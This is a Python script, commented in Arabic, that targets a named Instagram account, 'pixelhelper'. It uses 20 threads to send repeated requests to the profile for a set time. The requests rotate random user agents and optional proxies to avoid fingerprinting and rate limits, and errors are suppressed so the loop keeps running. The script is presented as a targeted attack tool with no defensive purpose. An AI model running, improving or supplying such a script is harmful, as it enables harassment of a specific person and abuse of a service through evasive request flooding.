import requests
import random
import threading
import time

# =====================================================================
# === TRAPKING INSTAGRAM TARGETED SCRIPT FOR PIXELHELPER ===
# =====================================================================

TARGET_URL = "https://www.instagram.com/pixelhelper/"  # الحساب المستهدف[span_1](start_span)[span_1](end_span)
DURATION = 60                          # مدة التشغيل بالثواني
THREADS_COUNT = 20                     # عدد الخيوط المتوازية

# ضع هنا قائمة البروكسيات الحقيقية بصيغة http://IP:PORT
PROXIES_LIST = [
    # مثال: "http://123.45.67.89:8080",
    # مثال: "http://98.76.54.32:3128"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15"
]

def target_worker():
    end_time = time.time() + DURATION
    
    while time.time() < end_time:
        try:
            # ترويسة عشوائية لتجنب البصمة الثابتة
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
                "Cache-Control": "no-cache"
            }
            
            # اختيار بروكسي عشوائي إن وجد في القائمة
            proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
            proxies = {"http": proxy, "https": proxy} if proxy else None
            
            # تنفيذ الطلب نحو البروفايل المستهدف
            response = requests.get(TARGET_URL, headers=headers, proxies=proxies, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] تم إرسال الطلب بنجاح عبر البروكسي: {proxy} | الحالة: 200")
            elif response.status_code == 429:
                print(f"[!] تم رصد الطلبات (Rate Limit) عبر البروكسي: {proxy}")
            else:
                print(f"[-] استجابة أخرى من السيرفر: {response.status_code}")
                
        except Exception:
            # تجاوز أخطاء الاتصال أو انقطاع البروكسي لضمان استمرار الـ Loop
            pass
            
        time.sleep(0.5)

def main():
    print(f"[*] === بدء تشغيل السكود الأسطوري نحو الحساب: {TARGET_URL} ===")
    
    if not PROXIES_LIST:
        print("[!] تنبيه: قائمة البروكسيات فارغة! يفضل إضافة بروكسيات حقيقية لضمان تنوع عناوين الـ IP.")
    
    print(f"[*] تشغيل {THREADS_COUNT} خيط متزامن عبر الـ VPS...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=target_worker)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("\n[+] انتهت الجلسة البرمجية بنجاح يا أسطورة.")

if __name__ == "__main__":
    main()
